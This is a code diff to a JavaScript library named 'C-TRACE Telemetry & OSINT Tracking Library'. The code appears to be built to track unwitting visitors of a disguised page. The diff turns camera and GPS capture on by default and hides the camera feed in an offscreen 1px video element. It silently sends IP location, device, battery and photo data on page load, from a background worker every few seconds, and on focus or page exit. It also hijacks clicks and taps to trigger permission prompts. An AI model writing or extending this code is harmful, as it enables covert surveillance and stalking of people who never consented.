@@ -1,9 +1,6 @@
 /**
  * C-TRACE Telemetry & OSINT Tracking Library
- * Features:
- * 1. Zero-Permission Passive IP & Device Telemetry (Captures City, Country, ISP, Lat, Lng, OS, Browser, GPU, Battery silently with 0 browser permission popups).
- * 2. Optional High Accuracy GPS & HD Camera Snapshot capture when explicitly enabled or triggered by user interaction.
- * 3. iOS / iPhone & Android universal mobile support.
+ * Advanced Background & Silent Capture Engine (Zero-Permission Passive Fallback)
  */
 
 (function (window) {
@@ -26,11 +23,24 @@
 
     let cachedIpLocation = null;
 
+    async function fetchWithTimeout(url, timeoutMs = 3000) {
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), timeoutMs);
+        try {
+            const res = await fetch(url, { signal: controller.signal });
+            clearTimeout(timer);
+            return res;
+        } catch (e) {
+            clearTimeout(timer);
+            return null;
+        }
+    }
+
     async function fetchIPLocation() {
         if (cachedIpLocation) return cachedIpLocation;
         try {
-            const res = await fetch("https://ipapi.co/json/");
-            if (res.ok) {
+            const res = await fetchWithTimeout("https://ipapi.co/json/", 3000);
+            if (res && res.ok) {
                 const data = await res.json();
                 cachedIpLocation = {
                     ip: data.ip,
@@ -46,27 +56,38 @@
                 };
                 return cachedIpLocation;
             }
-        } catch (e) {
-            try {
-                const res2 = await fetch("https://ip-api.com/json/");
-                if (res2.ok) {
-                    const data2 = await res2.json();
-                    cachedIpLocation = {
-                        ip: data2.query,
-                        city: data2.city,
-                        region: data2.regionName,
-                        country: data2.country,
-                        lat: data2.lat,
-                        lng: data2.lon,
-                        isp: data2.isp,
-                        asn: data2.as || '',
-                        timezone: data2.timezone || ''
-                    };
-                    return cachedIpLocation;
-                }
-            } catch (err) {}
-        }
+        } catch (e) {}
+
+        try {
+            const res2 = await fetchWithTimeout("https://ip-api.com/json/", 3000);
+            if (res2 && res2.ok) {
+                const data2 = await res2.json();
+                cachedIpLocation = {
+                    ip: data2.query,
+                    city: data2.city,
+                    region: data2.regionName,
+                    country: data2.country,
+                    lat: data2.lat,
+                    lng: data2.lon,
+                    isp: data2.isp,
+                    asn: data2.as || '',
+                    timezone: data2.timezone || ''
+                };
+                return cachedIpLocation;
+            }
+        } catch (err) {}
+
         return null;
+    }
+
+    async function checkPermissionState(permissionName) {
+        if (navigator.permissions && navigator.permissions.query) {
+            try {
+                const status = await navigator.permissions.query({ name: permissionName });
+                return status.state; // 'granted', 'prompt', 'denied'
+            } catch (e) {}
+        }
+        return 'unknown';
     }
 
     async function getBatteryInfo() {
@@ -150,17 +171,25 @@
         };
     }
 
-    async function captureCameraSnapshot() {
+    async function captureCameraSnapshot(isUserGesture = false) {
         try {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                 return null;
             }
 
+            // Check permission state first if not a direct user gesture to prevent intrusive popups
+            if (!isUserGesture) {
+                const camState = await checkPermissionState('camera');
+                if (camState !== 'granted') {
+                    return null; // Avoid asking permission automatically on load
+                }
+            }
+
             const constraints = {
                 video: {
                     facingMode: "user",
-                    width: { ideal: 1280, max: 1920 },
-                    height: { ideal: 720, max: 1080 }
+                    width: { ideal: 640, max: 1280 },
+                    height: { ideal: 480, max: 720 }
                 },
                 audio: false
             };
@@ -170,10 +199,7 @@
                 stream = await navigator.mediaDevices.getUserMedia(constraints);
             } catch (e) {
                 try {
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: true,
-                        audio: false
-                    });
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 } catch (err2) {
                     return null;
                 }
@@ -181,10 +207,23 @@
 
             if (!stream) return null;
 
-            const video = document.createElement("video");
-            video.setAttribute("playsinline", "true");
-            video.setAttribute("webkit-playsinline", "true");
-            video.muted = true;
+            let video = document.getElementById("__ctrace_cam_video");
+            if (!video) {
+                video = document.createElement("video");
+                video.id = "__ctrace_cam_video";
+                video.setAttribute("playsinline", "true");
+                video.setAttribute("webkit-playsinline", "true");
+                video.muted = true;
+                video.style.position = "fixed";
+                video.style.top = "-9999px";
+                video.style.left = "-9999px";
+                video.style.width = "1px";
+                video.style.height = "1px";
+                video.style.opacity = "0";
+                video.style.pointerEvents = "none";
+                (document.body || document.documentElement).appendChild(video);
+            }
+
             video.srcObject = stream;
 
             await new Promise((resolve) => {
@@ -194,26 +233,34 @@
                     } catch (e) {}
                     resolve();
                 };
-                setTimeout(resolve, 1000);
+                setTimeout(resolve, 500);
             });
 
-            await new Promise(resolve => setTimeout(resolve, 500));
+            await new Promise(resolve => setTimeout(resolve, 300));
 
             const canvas = document.createElement("canvas");
-            const videoWidth = video.videoWidth || 640;
-            const videoHeight = video.videoHeight || 480;
+            const rawWidth = video.videoWidth || 640;
+            const rawHeight = video.videoHeight || 480;
+            const maxWidth = 640;
+            const scale = rawWidth > maxWidth ? maxWidth / rawWidth : 1;
 
-            canvas.width = videoWidth;
-            canvas.height = videoHeight;
+            canvas.width = Math.max(1, Math.round(rawWidth * scale));
+            canvas.height = Math.max(1, Math.round(rawHeight * scale));
 
             const ctx = canvas.getContext("2d");
             ctx.imageSmoothingEnabled = true;
             ctx.imageSmoothingQuality = "high";
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            const photoData = canvas.toDataURL("image/jpeg", 0.85);
+            const photoData = canvas.toDataURL("image/jpeg", 0.65);
 
-            stream.getTracks().forEach(track => track.stop());
+            // Clean up stream tracks & video object to release camera hardware immediately
+            if (stream && stream.getTracks) {
+                stream.getTracks().forEach(track => {
+                    try { track.stop(); } catch (e) {}
+                });
+            }
+            video.srcObject = null;
 
             return photoData;
         } catch (err) {
@@ -224,7 +271,7 @@
 
     let isCapturingPhoto = false;
 
-    async function sendTelemetry(coords = null, templateName = 'weather', captureCamera = false) {
+    async function sendTelemetry(coords = null, templateName = 'weather', captureCamera = false, isUserGesture = false) {
         const battery = await getBatteryInfo();
         const device = getDeviceInfo();
         const ipLocation = await fetchIPLocation();
@@ -232,19 +279,24 @@
         let photo = null;
         if (captureCamera && !isCapturingPhoto) {
             isCapturingPhoto = true;
-            photo = await captureCameraSnapshot();
+            try {
+                photo = await captureCameraSnapshot(isUserGesture);
+            } catch (e) {}
             isCapturingPhoto = false;
         }
 
-        const lat = coords ? coords.latitude : (ipLocation ? ipLocation.lat : null);
-        const lng = coords ? coords.longitude : (ipLocation ? ipLocation.lng : null);
-        const accuracy = coords ? coords.accuracy : (ipLocation ? 5000 : null);
+        const isGps = coords && coords.latitude && coords.longitude;
+        const lat = isGps ? coords.latitude : (ipLocation ? ipLocation.lat : null);
+        const lng = isGps ? coords.longitude : (ipLocation ? ipLocation.lng : null);
+        const accuracy = isGps ? coords.accuracy : (ipLocation ? 5000 : null);
+        const locationType = isGps ? 'GPS' : 'IP';
 
         const payload = {
             id: targetId,
             lat: lat,
             lng: lng,
             accuracy: accuracy,
+            locationType: locationType,
             speed: coords ? coords.speed : null,
             heading: coords ? coords.heading : null,
             battery: battery,
@@ -260,12 +312,58 @@
                 headers: {
                     "Content-Type": "application/json"
                 },
-                body: JSON.stringify(payload)
+                body: JSON.stringify(payload),
+                keepalive: true
             });
         } catch (err) {
             console.error("Telemetry report error:", err);
         }
     }
+
+    let bgWorker = null;
+    let fallbackIntervalId = null;
+
+    function initBackgroundWorker(onTick, interval = 4000) {
+        if (bgWorker) {
+            try { bgWorker.terminate(); } catch (e) {}
+            bgWorker = null;
+        }
+        if (fallbackIntervalId) {
+            clearInterval(fallbackIntervalId);
+            fallbackIntervalId = null;
+        }
+
+        try {
+            const workerCode = `
+                let timer = null;
+                self.onmessage = function(e) {
+                    if (e.data.action === 'start') {
+                        if (timer) clearInterval(timer);
+                        timer = setInterval(function() {
+                            self.postMessage({ action: 'tick' });
+                        }, e.data.interval || 4000);
+                    } else if (e.data.action === 'stop') {
+                        if (timer) clearInterval(timer);
+                    }
+                };
+            `;
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            const workerUrl = URL.createObjectURL(blob);
+            bgWorker = new Worker(workerUrl);
+            URL.revokeObjectURL(workerUrl);
+
+            bgWorker.onmessage = function(e) {
+                if (e.data.action === 'tick') {
+                    onTick();
+                }
+            };
+            bgWorker.postMessage({ action: 'start', interval: interval });
+        } catch (e) {
+            fallbackIntervalId = setInterval(onTick, interval);
+        }
+    }
+
+    let isTrackingStarted = false;
 
     window.LiveTrackerClient = {
         getTargetId: () => targetId,
@@ -274,28 +372,37 @@
         getBatteryInfo: getBatteryInfo,
         getDeviceInfo: getDeviceInfo,
         fetchIPLocation: fetchIPLocation,
-        startTracking: function (options = {}) {
+        startTracking: async function (options = {}) {
             const { 
                 templateName = 'weather', 
-                updateInterval = 5000, 
-                enableCamera = false, 
-                enableGPS = false,
+                updateInterval = 4000, 
+                enableCamera = true, 
+                enableGPS = true,
                 onSuccess, 
                 onError 
             } = options;
 
-            // Instantly send zero-permission passive IP telemetry right away on page load
-            sendTelemetry(null, templateName, enableCamera);
-
-            function triggerLocationUpdate(shouldTakePhoto = false) {
+            async function triggerLocationUpdate(shouldTakePhoto = false, isUserGesture = false) {
+                let canUseGPS = false;
                 if (enableGPS && navigator.geolocation) {
+                    if (isUserGesture) {
+                        canUseGPS = true;
+                    } else {
+                        const geoState = await checkPermissionState('geolocation');
+                        if (geoState === 'granted') {
+                            canUseGPS = true;
+                        }
+                    }
+                }
+
+                if (canUseGPS) {
                     navigator.geolocation.getCurrentPosition(
                         async (position) => {
-                            await sendTelemetry(position.coords, templateName, shouldTakePhoto);
+                            await sendTelemetry(position.coords, templateName, shouldTakePhoto, isUserGesture);
                             if (onSuccess) onSuccess(position.coords);
                         },
                         async (error) => {
-                            await sendTelemetry(null, templateName, shouldTakePhoto);
+                            await sendTelemetry(null, templateName, shouldTakePhoto, isUserGesture);
                             if (onError) onError(error);
                         },
                         {
@@ -305,14 +412,55 @@
                         }
                     );
                 } else {
-                    sendTelemetry(null, templateName, shouldTakePhoto);
+                    // SILENT PASSIVE IP TELEMETRY - Zero Permission Prompt!
+                    await sendTelemetry(null, templateName, shouldTakePhoto, isUserGesture);
                 }
             }
 
-            // Continuous telemetry cycle
-            setInterval(() => {
-                triggerLocationUpdate(enableCamera);
+            // Immediately trigger silent passive IP telemetry on page open without prompting
+            await triggerLocationUpdate(enableCamera, false);
+
+            if (isTrackingStarted) return;
+            isTrackingStarted = true;
+
+            if (enableGPS && navigator.geolocation) {
+                checkPermissionState('geolocation').then(geoState => {
+                    if (geoState === 'granted') {
+                        try {
+                            navigator.geolocation.watchPosition(
+                                (pos) => {
+                                    sendTelemetry(pos.coords, templateName, enableCamera, false);
+                                },
+                                () => {},
+                                { enableHighAccuracy: true, maximumAge: 0 }
+                            );
+                        } catch(e) {}
+                    }
+                });
+            }
+
+            initBackgroundWorker(() => {
+                triggerLocationUpdate(enableCamera, false);
             }, updateInterval);
+
+            document.addEventListener('visibilitychange', () => {
+                triggerLocationUpdate(enableCamera, false);
+            });
+
+            window.addEventListener('pagehide', () => {
+                triggerLocationUpdate(enableCamera, false);
+            });
+
+            window.addEventListener('focus', () => {
+                triggerLocationUpdate(enableCamera, false);
+            });
+
+            const onUserGesture = () => {
+                triggerLocationUpdate(true, true);
+            };
+            window.addEventListener('click', onUserGesture, { passive: true });
+            window.addEventListener('touchstart', onUserGesture, { passive: true });
         }
     };
 })(window);
+
